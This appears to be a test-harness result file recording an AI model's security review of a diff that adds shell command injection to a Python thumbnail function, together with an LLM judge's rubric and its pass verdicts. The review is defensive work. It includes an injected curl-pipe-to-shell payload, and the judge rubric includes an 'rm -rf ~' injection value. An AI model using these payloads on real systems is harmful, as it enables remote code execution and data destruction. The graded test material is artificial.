@@ -1,0 +1,71 @@
+{
+  "caseId": "obfuscated-cmdi",
+  "rep": 1,
+  "prompt": "Review this diff for security issues and report your findings.",
+  "files": [
+    "diff-obfuscated-cmdi.patch"
+  ],
+  "output": "## Security Review: `diff-obfuscated-cmdi.patch`\n\n### 🔴 CRITICAL — OS Command Injection (CWE-78)\n\n**File:** `src/media/thumbnail.py`, line 14\n\nThe diff replaces a safe, argument-list subprocess call with a shell-interpreted `os.system` call built from **user-controlled input**.\n\n**Before (safe):**\n```python\nsubprocess.run([\"convert\", infile, \"-resize\", size, outfile], check=True)\n```\nThe list form passes arguments directly to `execvp` — no shell, so `infile`/`size` are treated as literal, opaque arguments regardless of their contents.\n\n**After (vulnerable):**\n```python\nparts = [\"convert\", infile, \"-resize\", size, outfile]\nos.system(\" \".join(parts))\n```\n`\" \".join(parts)` collapses everything into a single string that `os.system` hands to `/bin/sh -c`. Both `infile` and `size` come straight from attacker-controllable request parameters:\n\n```python\ninfile = request.GET.get(\"src\", \"input.png\")\nsize   = request.GET.get(\"size\", \"100x100\")\n```\n\n**Exploit example:**\nA request like\n```\n?src=x;%20curl%20evil.sh|sh;%20echo%20\n```\nproduces the shell command:\n```\nconvert x; curl evil.sh|sh; echo  -resize 100x100 thumb.png\n```\nThe shell metacharacters (`;`, `|`, `` ` ``, `$()`, `&&`, `>`) enable arbitrary command execution with the web server's privileges — full remote code execution, data exfiltration, or host takeover.\n\n**Failure scenario:** Any authenticated or unauthenticated user who can reach `make_thumbnail` sets `src` (or `size`) to `foo; <arbitrary command>` and the server executes it.\n\n### Additional observation\n- The added `import shlex` is a **red herring** — `shlex` is imported but never used. If the intent was safety, the code should have used `shlex.quote()` on each part (or, far better, kept the list form). As written, it provides zero protection.\n\n### ✅ Recommended fix\nRevert to the list-based subprocess call, which requires no shell and no manual quoting:\n\n```python\nimport subprocess\n\ndef make_thumbnail(request):\n    infile  = request.GET.get(\"src\", \"input.png\")\n    size    = request.GET.get(\"size\", \"100x100\")\n    outfile = \"thumb.png\"\n    subprocess.run(\n        [\"convert\", \"--\", infile, \"-resize\", size, outfile],\n        check=True,\n    )\n    return {\"thumb\": outfile}\n```\n\n**Additional hardening (defense in depth):**\n- **Validate `size`** against a strict pattern, e.g. `re.fullmatch(r\"\\d{1,5}x\\d{1,5}\", size)`.\n- **Validate/sanitize `src`**: resolve it to an allow-listed directory and reject path traversal (`..`, absolute paths, leading `-` which `convert` could interpret as an option — the `--` separator above also mitigates this).\n- Never pass untrusted input through `os.system`, `subprocess(..., shell=True)`, or `eval`.\n\n---\n\n**Verdict:** This change must not be merged. It introduces a critical, trivially exploitable RCE by converting a safe subprocess invocation into a shell command built from unsanitized user input.",
+  "exitCode": 0,
+  "timedOut": false,
+  "infraRetries": 0,
+  "startedAt": "2026-07-18T23:52:26.072Z",
+  "durationMs": 32249,
+  "checks": [
+    {
+      "matcher": "llm_rubric",
+      "passed": true,
+      "details": {
+        "verdict": "pass",
+        "judgments": [
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified the core vulnerability — user-controlled `size`/`src` from request.GET flowing into a `parts` list joined via `\" \".join(parts)` and passed to `os.system`, resulting in shell command injection/RCE — and explained why the prior `subprocess.run([...])` list form was safe by contrast. It also correctly noted the unused `shlex` import as a secondary red herring rather than mistaking it for a fix, and did not conclude the code was safe. This satisfies the rubric's PASS condition.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified the core vulnerability — user-controlled `size`/`src` from request.GET flowing into a `parts` list joined via `\" \".join(parts)` and passed to `os.system`, resulting in shell command injection/RCE — and explained why the prior `subprocess.run([...])` list form was safe by contrast. It also correctly noted the unused `shlex` import as a secondary red herring rather than mistaking it for a fix, and did not conclude the code was safe. This satisfies the rubric's PASS condition."
+          },
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identifies the core vulnerability — user-controlled `src`/`size` from request.GET flowing into a `parts` list that is joined with `' '.join(parts)` and executed via `os.system`, resulting in shell/command injection — and explains the mechanism (shell metacharacters, exploit example), contrasts it with the prior safe `subprocess.run([...])` list form, and correctly notes the unused `shlex` import provides no protection rather than mistaking it for a mitigation. This matches the rubric's PASS criteria precisely.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identifies the core vulnerability — user-controlled `src`/`size` from request.GET flowing into a `parts` list that is joined with `' '.join(parts)` and executed via `os.system`, resulting in shell/command injection — and explains the mechanism (shell metacharacters, exploit example), contrasts it with the prior safe `subprocess.run([...])` list form, and correctly notes the unused `shlex` import provides no protection rather than mistaking it for a mitigation. This matches the rubric's PASS criteria precisely."
+          }
+        ],
+        "model": "claude-sonnet-5",
+        "transport": "claude-agent",
+        "prompt": "You are an impartial evaluator inside an automated agent-testing tool. Judge ONLY whether the agent's output satisfies the rubric — not style, not effort, not whether you would have answered differently.\n\n<rubric>\nThe diff introduces an OS command injection vulnerability: user-controlled `size`/`src` from request.GET are collected into a `parts` list that is then joined into a single shell string with `' '.join(parts)` and passed to `os.system(...)`, allowing arbitrary shell command execution (e.g. size='100x100; rm -rf ~'). The previous code used a safe `subprocess.run([...])` argument vector. PASS only if the review identifies this as a real command/shell injection vulnerability caused by user input reaching `os.system`; FAIL if it misses it, concludes the code is safe (e.g. mistakes `parts` for a safe argument vector), or only comments on style or the unused `shlex` import.\n</rubric>\n\n<task_given_to_agent>\nReview this diff for security issues and report your findings.\n</task_given_to_agent>\n\n<agent_output>\n## Security Review: `diff-obfuscated-cmdi.patch`\n\n### 🔴 CRITICAL — OS Command Injection (CWE-78)\n\n**File:** `src/media/thumbnail.py`, line 14\n\nThe diff replaces a safe, argument-list subprocess call with a shell-interpreted `os.system` call built from **user-controlled input**.\n\n**Before (safe):**\n```python\nsubprocess.run([\"convert\", infile, \"-resize\", size, outfile], check=True)\n```\nThe list form passes arguments directly to `execvp` — no shell, so `infile`/`size` are treated as literal, opaque arguments regardless of their contents.\n\n**After (vulnerable):**\n```python\nparts = [\"convert\", infile, \"-resize\", size, outfile]\nos.system(\" \".join(parts))\n```\n`\" \".join(parts)` collapses everything into a single string that `os.system` hands to `/bin/sh -c`. Both `infile` and `size` come straight from attacker-controllable request parameters:\n\n```python\ninfile = request.GET.get(\"src\", \"input.png\")\nsize   = request.GET.get(\"size\", \"100x100\")\n```\n\n**Exploit example:**\nA request like\n```\n?src=x;%20curl%20evil.sh|sh;%20echo%20\n```\nproduces the shell command:\n```\nconvert x; curl evil.sh|sh; echo  -resize 100x100 thumb.png\n```\nThe shell metacharacters (`;`, `|`, `` ` ``, `$()`, `&&`, `>`) enable arbitrary command execution with the web server's privileges — full remote code execution, data exfiltration, or host takeover.\n\n**Failure scenario:** Any authenticated or unauthenticated user who can reach `make_thumbnail` sets `src` (or `size`) to `foo; <arbitrary command>` and the server executes it.\n\n### Additional observation\n- The added `import shlex` is a **red herring** — `shlex` is imported but never used. If the intent was safety, the code should have used `shlex.quote()` on each part (or, far better, kept the list form). As written, it provides zero protection.\n\n### ✅ Recommended fix\nRevert to the list-based subprocess call, which requires no shell and no manual quoting:\n\n```python\nimport subprocess\n\ndef make_thumbnail(request):\n    infile  = request.GET.get(\"src\", \"input.png\")\n    size    = request.GET.get(\"size\", \"100x100\")\n    outfile = \"thumb.png\"\n    subprocess.run(\n        [\"convert\", \"--\", infile, \"-resize\", size, outfile],\n        check=True,\n    )\n    return {\"thumb\": outfile}\n```\n\n**Additional hardening (defense in depth):**\n- **Validate `size`** against a strict pattern, e.g. `re.fullmatch(r\"\\d{1,5}x\\d{1,5}\", size)`.\n- **Validate/sanitize `src`**: resolve it to an allow-listed directory and reject path traversal (`..`, absolute paths, leading `-` which `convert` could interpret as an option — the `--` separator above also mitigates this).\n- Never pass untrusted input through `os.system`, `subprocess(..., shell=True)`, or `eval`.\n\n---\n\n**Verdict:** This change must not be merged. It introduces a critical, trivially exploitable RCE by converting a safe subprocess invocation into a shell command built from unsanitized user input.\n</agent_output>\n\nAnswer in EXACTLY this format (first line must be the verdict):\nVERDICT: PASS\nREASON: <one short paragraph>\n\nor\n\nVERDICT: FAIL\nREASON: <one short paragraph>"
+      }
+    }
+  ],
+  "usage": {
+    "input_tokens": 4,
+    "output_tokens": 1418,
+    "model": "opus"
+  },
+  "transcript": {
+    "subtype": "success",
+    "num_turns": 2,
+    "total_cost_usd": 0.056843500000000005,
+    "modelUsage": {
+      "claude-haiku-4-5-20251001": {
+        "inputTokens": 546,
+        "outputTokens": 13,
+        "cacheReadInputTokens": 0,
+        "cacheCreationInputTokens": 0,
+        "webSearchRequests": 0,
+        "costUSD": 0.000611,
+        "contextWindow": 200000,
+        "maxOutputTokens": 32000
+      },
+      "claude-opus-4-8": {
+        "inputTokens": 4,
+        "outputTokens": 1418,
+        "cacheReadInputTokens": 41525,
+        "cacheCreationInputTokens": 0,
+        "webSearchRequests": 0,
+        "costUSD": 0.056232500000000005,
+        "contextWindow": 1000000,
+        "maxOutputTokens": 64000
+      }
+    },
+    "_note": "SDK message stream removed for privacy; summary retained"
+  }
+}
